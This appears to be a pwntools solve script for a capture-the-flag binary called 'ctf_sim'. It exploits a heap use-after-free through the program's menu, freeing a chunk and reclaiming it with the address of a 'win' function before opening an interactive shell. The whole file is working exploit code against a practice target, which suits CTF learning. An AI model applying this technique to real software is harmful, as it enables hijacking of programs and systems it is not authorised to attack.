#!/usr/bin/env python3
#Heap UAF

from pwn import *

exe = ELF('ctf_sim')

context.binary = exe
context.log_level='debug'

def conn():
    if args.REMOTE:
        io = remote("addr", 1337)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io


def download(cat, idx):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'> ', str(cat)) #1-5
    io.sendlineafter(b'> ', str(idx)) #0-3

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'> ', str(idx)) #0-3

def writeup(size,data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'> ', str(size))
    io.sendlineafter(b'> ', data)

io = conn()

download(1,0)
free(0)
writeup(16, p64(exe.sym.win_addr)) #UAF
free(0) 

io.interactive()
